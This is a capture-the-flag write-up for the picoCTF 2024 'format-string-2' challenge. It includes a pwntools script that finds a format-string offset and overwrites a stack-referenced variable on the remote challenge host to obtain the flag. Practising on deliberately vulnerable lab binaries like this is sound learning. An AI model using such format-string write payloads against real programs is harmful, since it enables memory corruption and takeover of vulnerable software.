# Description

_#Medium_<br>
_#Binary_Exploitation_<br>
_#picoCTF_2024_<br>
_#format_string_<br>
_#browser_webshell_solvable_<br>

This program is not impressed by cheap parlor tricks like reading arbitrary data off the stack. To impress this program you must change data on the stack!<br>
Download the binary [here](../format-string-2).<br>
Download the source [here](../format-string-2.c).

## Solution

1. Connect with the challenge instance.
2. Review the c source code given to investigate.
3. We'll then found out that the input read is printed as hex values.

   ![image](https://github.com/user-attachments/assets/fbda7617-3b95-471c-afe9-241b8b6592d8)
   **`scanf` will take the input until it encounters any newline, tab or space. Meaning that payloads could be inputted as well. To find the flag, we need to change the value of sus.*
   
4. To overwrite the value of sus, we'll need to find the address of it and export it as a file named "objdump.txt".<br>
   `objdump -D vuln > objdump.txt`
5. Then, write a python script with pwntools to automatically find the offset and overwrite it.

   ```python
   from pwn import *

   context.log_level = "critical"
   context.binary = ELF('./vuln')
   
   p = remote('rhea.picoctf.net', 57163)
   
   def exec_fmt(payload):
       p = remote('rhea.picoctf.net', 57163)
       p.sendline(payload)
       return p.recvall()
   
   autofmt = FmtStr(exec_fmt)
   offset = autofmt.offset
   
   payload = fmtstr_payload(offset, {0x404060: 0x67616c66})
   
   p.sendline(payload)
   
   flag = p.recvall()
   
   print("Flag: ", flag)
   ```

   **The script above is got from [here](https://github.com/noamgariani11/picoCTF-2024-Writeup/blob/main/Binary%20Explotation/format-string-2.md).*
6. Get the flag.
